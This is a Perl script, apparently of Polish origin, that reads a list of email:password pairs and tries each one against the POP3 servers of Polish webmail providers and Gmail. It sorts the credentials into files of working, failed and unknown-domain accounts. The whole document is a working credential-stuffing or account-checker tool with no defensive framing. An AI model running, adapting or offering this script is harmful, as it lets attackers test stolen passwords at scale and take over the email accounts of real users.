#!url/bin/perl
    # script by pl_profile


    use strict;
    use Net::POP3;
    use Term::ANSIColor;

    my $mails = @ARGV[0];
    my $dzial = 'dziala.txt';
    my $niezna = 'nieznam.txt';
    my $niedzial = 'niedz.txt';    
    my $username;
    my $test = 0;    
    my $password;
    my $domena;
    my $i=0;

    open(FD, $mails) or die "Nie moge otworzyc pierwszego pliku";
    while(<FD>)
    {
       $_ =~ m/([^:]*):(\S*)/;
       $username = $1;
       $password = $2;
       &checkdomain($username);
    }

    sub checkdomain {
       my $login = shift(@_);
       if($login =~ m/^([^@]+)@(wp\.pl|wp\.eu)/i)
       {
          $domena = "wp";
          &checkmail($domena);
       }
       elsif($login =~ m/^([^@]+)@(onet\.pl|onet\.eu|vp\.pl|op\.pl|spoko\.pl|poczta\.onet\.pl|vip\.onet\.pl|autograf\.pl|onet\.com\.pl|opoczta\.pl|buziaczek\.pl|amorki\.pl|buziaczki.onet.pl|poczta.onet.eu|autograf.pl)/i)
       {
          $domena = "onet";
          &checkmail($domena);
       }
       elsif($login =~ m/^([^@]+)@(interia\.pl|poczta\.fm|interia\.eu)/i)
       {
          $domena = "interia";
          &checkmail($domena);
       }
       elsif($login =~ m/^([^@]+)@(o2\.pl|tlen\.pl|prokonto\.pl|go2\.pl)/i)
       {
          $domena = "o2";
          &checkmail($domena);
       }
       elsif($login =~ m/^([^@]+)@(gmail\.com)/i)
       {
          $domena = "gmail";
          &checkmail($domena);
       }
       elsif($login =~ m/^([^@]+)@(poczta\.pl)/i)
       {
          $domena = "poczta";
          &checkmail($domena);
       }
       elsif($login =~ m/^([^@]+)@(1gb\.pl|2gb\.pl|serwus\.pl|vip\.interia\.pl|akcja\.pl|czateria\.pl)/i)
       {
          $domena = "vipinteria";
          &checkmail($domena);
       }
       else
       {
          $domena = "none";
          &checkmail($domena);
       }
    }

    sub checkmail {
       my $pop3;
       my $domena = shift(@_);
       if($domena =~ m/wp/)
       {
          if($pop3 = Net::POP3->new("pop3.wp.pl", Timeout=>120))
          {
         $test = $pop3->login($username, $password);
             $test > 0 ? &save($test) : &save_nie;
          }
          else
          {
             print $username." - Nie moge polaczyc sie z serwerem!\n";
          }
       }
       elsif($domena =~ m/onet/)
       {
          if($pop3 = Net::POP3->new("pop3.poczta.onet.pl", Timeout=>120))
          {
         $test = $pop3->login($username, $password);
             $test > 0 ? &save($test) : &save_nie;
          }
          else
          {
             print $username." - Nie moge polaczyc sie z serwerem!\n";
          }
       }
       elsif($domena =~ m/o2/)
       {
          if($pop3 = Net::POP3->new("poczta.o2.pl", Timeout=>120))
          {
         $test = $pop3->login($username, $password);
             $test > 0 ? &save($test) : &save_nie;
          }
          else
          {
             print $username." - Nie moge polaczyc sie z serwerem!\n";
          }

       }
       elsif($domena =~ m/interia/)
       {
          if($pop3 = Net::POP3->new("poczta.interia.pl", Timeout=>120))
          {
         $test = $pop3->login($username, $password);
             $test > 0 ? &save($test) : &save_nie;
          }
          else
          {
             print $username." - Nie moge polaczyc sie z serwerem!\n";
          }
       }
       elsif($domena =~ m/poczta/)
       {
          if($pop3 = Net::POP3->new("pop3.poczta.pl", Timeout=>120))
          {
         $test = $pop3->login($username, $password);
             $test > 0 ? &save($test) : &save_nie;
          }
       }
       elsif($domena =~ m/vipinteria/)
       {
          if($pop3 = Net::POP3->new("poczta.vip.interia.pl", Timeout=>120))
          {
         $test = $pop3->login($username, $password);
             $test > 0 ? &save($test) : &save_nie;
          }
          else
          {
             print $username." - Nie moge polaczyc sie z serwerem!\n";
          }
       }
       elsif($domena =~m/none/)
       {
          print $username." - Nie znam domeny!\n";
                 open(UNKNOW, ">>$niezna") or die "Blad podczas otwierania pliku! \n";
                 print UNKNOW $username." : ".$password."\n";
                 close(UNKNOW);
       }
    }

    sub save {
       print color("yellow"), $username." : ".$password ." - Dziala :> \n", color("reset");
       open(OUT, ">>$dzial") or die "Blad podczas otwierania drugiego pliku!";
       print OUT $username." : ".$_[0]." : ".$password."\n";
       close(OUT);
    }
    sub save_nie {
       print $username." - Nie dziala :< \n";
       open(OUT, ">>$niedzial") or die "Blad podczas otwierania drugiego pliku!";
       print OUT $username.":".$password."\n";
       close(OUT);
    }    